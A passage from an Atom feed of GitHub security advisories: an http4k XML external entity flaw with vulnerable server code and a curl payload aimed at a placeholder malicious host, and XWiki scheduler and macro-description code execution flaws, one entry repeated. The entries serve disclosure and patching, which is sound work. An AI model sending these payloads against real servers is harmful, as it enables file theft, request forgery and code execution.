        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><em>Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.</em></p>
<p>There is a potential XXE(XML External Entity Injection) vulnerability when http4k handling malicious XML contents within requests, which might allow attackers to read local sensitive information on server, trigger Server-side Request Forgery and even execute code under some circumstances.</p>
<h3 id="details">Details</h3>
<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>
<a href="https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a>
XML contents is parsed with DocumentBuilder without security settings on or external entity enabled</p>
<h3 id="poc">PoC</h3>
<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em></p>
<h4 id="example-vulnerable-server-code">Example Vulnerable server code:</h4>
<pre><code>import org.http4k.core.*
import org.http4k.format.Xml.xml
import org.http4k.server.Netty
import org.http4k.server.asServer
import org.w3c.dom.Document

fun main() {

    val xmlLens = Body.xml().toLens()

    // Create an HTTP handler
    val app: HttpHandler = { request -&gt;
        try {
            // Parse the incoming XML payload to a Document object
            val xmlDocument: Document = xmlLens(request)

            // Extract root element name or other details from the XML
            val rootElementName = xmlDocument.documentElement.nodeName

            // Create a response XML based on the extracted information
            val responseXml = """
                &lt;response&gt;
                    &lt;message&gt;Root element is: $rootElementName&lt;/message&gt;
                &lt;/response&gt;
            """.trimIndent()

            // Respond with XML
            Response(Status.OK).body(responseXml).header("Content-Type", "application/xml")
        } catch (e: Exception) {
            // Handle invalid XML or other errors
            Response(Status.BAD_REQUEST).body("Invalid XML: ${e.message}")
        }
    }

    // Start the server
    val server = app.asServer(Netty(9000)).start()
    println("Server started on http://localhost:9000")
}
</code></pre>
<h4 id="maven-dependency">Maven dependency:</h4>
<pre><code>&lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;
            &lt;artifactId&gt;kotlin-test-junit5&lt;/artifactId&gt;
            &lt;version&gt;1.9.0&lt;/version&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
            &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;
            &lt;version&gt;5.10.0&lt;/version&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;
            &lt;artifactId&gt;kotlin-stdlib&lt;/artifactId&gt;
            &lt;version&gt;1.9.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.http4k&lt;/groupId&gt;
            &lt;artifactId&gt;http4k-core&lt;/artifactId&gt;
            &lt;version&gt;5.40.0.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- Http4k XML format --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.http4k&lt;/groupId&gt;
            &lt;artifactId&gt;http4k-format-xml&lt;/artifactId&gt;
            &lt;version&gt;5.40.0.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- http4k Netty --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.http4k&lt;/groupId&gt;
            &lt;artifactId&gt;http4k-server-netty&lt;/artifactId&gt;
            &lt;version&gt;5.40.0.0&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<h4 id="exploit-payload-example-to-trigger-ssrf">Exploit payload example to trigger SSRF</h4>
<p><code>curl -X POST http://localhost:9000 -H "Content-Type: application/xml" -d "&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \"https://replace.with.your.malicious.website/poc\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"</code></p>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em>
The servers that employ this XML parsing feature of http4k are vulnerable to this XXE vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw">https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw</a></li>
<li><a href="https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc">https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc</a></li>
<li><a href="https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55875">https://nvd.nist.gov/vuln/detail/CVE-2024-55875</a></li>
<li><a href="https://github.com/advisories/GHSA-7mj5-hjjj-8rgw">https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mj5-hjjj-8rgw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-12T19:22:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-scheduler-ui] XWiki's scheduler in subwiki allows scheduling operations for any main wiki user]]></title>
        <id>https://github.com/advisories/GHSA-cwq6-mjmx-47p6</id>
        <link href="https://github.com/advisories/GHSA-cwq6-mjmx-47p6"/>
        <updated>2024-12-12T22:31:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any user with an account on the main wiki could run scheduling operations on subwikis.
To reproduce, as a user on the main wiki without any special right, view the document <code>Scheduler.WebHome</code> in a subwiki. Then, click on any operation (<em>e.g.,</em> Trigger) on any job. If the operation is successful, then the instance is vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in XWiki 15.10.9 and 16.3.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you have subwikis where the Job Scheduler is enabled, you can edit the objects on <code>Scheduler.WebPreferences</code> to match <a href="https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21663">https://jira.xwiki.org/browse/XWIKI-21663</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://jira.xwiki.org/">Jira XWiki.org</a></li>
<li>Email us at <a href="mailto:security@xwiki.org">Security Mailing List</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21663">https://jira.xwiki.org/browse/XWIKI-21663</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55876">https://nvd.nist.gov/vuln/detail/CVE-2024-55876</a></li>
<li><a href="https://github.com/advisories/GHSA-cwq6-mjmx-47p6">https://github.com/advisories/GHSA-cwq6-mjmx-47p6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwq6-mjmx-47p6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-12T19:21:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-scheduler-ui] XWiki's scheduler in subwiki allows scheduling operations for any main wiki user]]></title>
        <id>https://github.com/advisories/GHSA-cwq6-mjmx-47p6</id>
        <link href="https://github.com/advisories/GHSA-cwq6-mjmx-47p6"/>
        <updated>2024-12-12T22:31:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any user with an account on the main wiki could run scheduling operations on subwikis.
To reproduce, as a user on the main wiki without any special right, view the document <code>Scheduler.WebHome</code> in a subwiki. Then, click on any operation (<em>e.g.,</em> Trigger) on any job. If the operation is successful, then the instance is vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in XWiki 15.10.9 and 16.3.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you have subwikis where the Job Scheduler is enabled, you can edit the objects on <code>Scheduler.WebPreferences</code> to match <a href="https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331#diff-8e274bd0065e319a34090339de6dfe56193144d15fd71c52c1be7272254728b4</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21663">https://jira.xwiki.org/browse/XWIKI-21663</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://jira.xwiki.org/">Jira XWiki.org</a></li>
<li>Email us at <a href="mailto:security@xwiki.org">Security Mailing List</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-cwq6-mjmx-47p6</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331">https://github.com/xwiki/xwiki-platform/commit/54bcc5a7a2e440cc591b91eece9c13dc0c487331</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-21663">https://jira.xwiki.org/browse/XWIKI-21663</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55876">https://nvd.nist.gov/vuln/detail/CVE-2024-55876</a></li>
<li><a href="https://github.com/advisories/GHSA-cwq6-mjmx-47p6">https://github.com/advisories/GHSA-cwq6-mjmx-47p6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwq6-mjmx-47p6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-12T19:21:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.platform:xwiki-platform-help-ui] XWiki allows remote code execution from account through macro descriptions and XWiki.XWikiSyntaxMacrosList]]></title>
        <id>https://github.com/advisories/GHSA-2r87-74cx-2p7c</id>
        <link href="https://github.com/advisories/GHSA-2r87-74cx-2p7c"/>
        <updated>2024-12-12T22:33:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any user with an account can perform arbitrary remote code execution by adding instances of <code>XWiki.WikiMacroClass</code> to any page. This compromises the confidentiality, integrity and availability of the whole XWiki installation.</p>
<p>To reproduce on a instance, as a connected user without script nor programming rights, go to your user profile and add an object of type <code>XWiki.WikiMacroClass</code>. Set "Macro Id", "Macro Name" and "Macro Code" to any value, "Macro Visibility" to <code>Current User</code> and "Macro Description" to <code>{{async}}{{groovy}}println("Hello from User macro!"){{/groovy}}{{/async}}</code>.
Save the page, then go to <code>&lt;host&gt;/xwiki/bin/view/XWiki/XWikiSyntaxMacrosList</code>.
If the description of your new macro reads "Hello from User macro!", then your instance is vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in XWiki 15.10.11, 16.4.1 and 16.5.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is possible to manually apply <a href="https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3#diff-92fee29683e671b8bc668e3cf4295713d6259f715e3954876049f9de77c0a9ef">this patch</a> to the page <code>XWiki.XWikiSyntaxMacrosList</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://jira.xwiki.org/browse/XWIKI-22030">https://jira.xwiki.org/browse/XWIKI-22030</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3">https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2r87-74cx-2p7c">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2r87-74cx-2p7c</a></li>
<li><a href="https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3">https://github.com/xwiki/xwiki-platform/commit/40e1afe001d61eafdf13f3621b4b597a0e58a3e3</a></li>
<li><a href="https://jira.xwiki.org/browse/XWIKI-22030">https://jira.xwiki.org/browse/XWIKI-22030</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55877">https://nvd.nist.gov/vuln/detail/CVE-2024-55877</a></li>
<li><a href="https://github.com/advisories/GHSA-2r87-74cx-2p7c">https://github.com/advisories/GHSA-2r87-74cx-2p7c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r87-74cx-2p7c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-12T19:21:06.000Z</published>
    </entry>
</feed>